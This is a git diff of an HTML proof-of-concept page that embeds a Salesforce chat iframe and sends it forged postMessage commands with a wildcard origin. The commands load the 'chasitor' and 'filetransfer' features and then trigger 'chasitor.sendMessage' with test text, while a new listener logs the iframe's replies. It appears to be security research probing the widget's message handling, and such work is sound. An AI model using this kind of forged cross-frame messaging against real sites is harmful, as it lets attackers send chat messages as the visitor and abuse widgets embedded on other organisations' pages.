@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce Exploitation PoC</title>
+  <title>Salesforce iframe escalation test</title>
 </head>
 <body>
-  <h2>PoC: Controlled Message to Salesforce iframe</h2>
+  <h2>PoC: Trigger chasitor.sendMessage</h2>
 
   <iframe
     id="eswFrame"
@@ -15,26 +15,27 @@
   ></iframe>
 
   <script>
+    window.addEventListener("message", (e) => {
+      console.log("📩 Message from iframe:", e.data);
+    });
+
     function runPoC() {
       const iframe = document.getElementById("eswFrame").contentWindow;
 
       console.log("[+] Iframe loaded (Salesforce 4.0)");
 
-      // Message 1: Load basic features
+      // Load required features
       ["chasitor", "filetransfer"].forEach(feature => {
         console.log(`📤 Sending script.load for feature: '${feature}'`);
         iframe.postMessage({ method: "script.load", feature }, "*");
       });
 
-      // Message 2: Send a fake but harmless event to confirm message handling
+      // Send fake chasitor.sendMessage
       setTimeout(() => {
-        console.log("📤 Sending fake liveagent.event to iframe");
+        console.log("📤 Sending fake chasitor.sendMessage");
         iframe.postMessage({
-          method: "liveagent.event",
-          data: {
-            event: "customEventName",
-            params: { key1: "value1", key2: "value2" }
-          }
+          method: "chasitor.sendMessage",
+          data: "This is a test message"
         }, "*");
       }, 1000);
     }
